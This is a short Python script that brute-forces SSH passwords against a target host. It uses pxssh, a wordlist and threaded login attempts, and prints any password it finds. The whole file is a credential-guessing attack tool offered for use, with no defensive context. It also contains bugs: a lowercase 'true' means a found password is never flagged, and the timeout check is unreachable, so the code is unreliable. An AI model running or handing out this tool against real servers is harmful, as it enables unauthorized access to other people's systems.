#brute force in python
from pexpect import pxssh
import optparse
import time
from threading import *

max_conenctions = 5
#semaphore
connection_lock = BoundedSemaphore(value=max_conenctions)
Found = False
Fails = 0

def connect(host, username, password, release):
    global Found
    global Fails
    
    try:
        s = pxssh.pxssh()
        s.login(host, username, password)
        print('[+] Password Found: ' + password)
        Found = true
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, username, password, False)
        elif 'syncronize with orginal prompt' in str(e):
            time.sleep(1)
            connect(host, username, password, False)
    finally:
        if release: connection_lock.release()
        
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <username> -F <password list>')
    parser.add_option('-H', dest="tgtHost", type="string", help="Specify target host")
    parser.add_option('-F', dest="passwdFile", type="string", help="Specify password file")
    parser.add_option('-u', dest="username", type="string", help="Specify the user")
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    username = options.username
    
    if host == None or passwdFile == None or username == None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print('[*] Existing: password found')
            exit(0)
            if Fails > 5:
                print('[!] Too many socket timeouts')
                exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print('[-] testing: '+ str(password))
        t = Thread(target=connect, args=(host, username, password, True))
        child = t.start()
        
if __name__ == '__main__':
    main()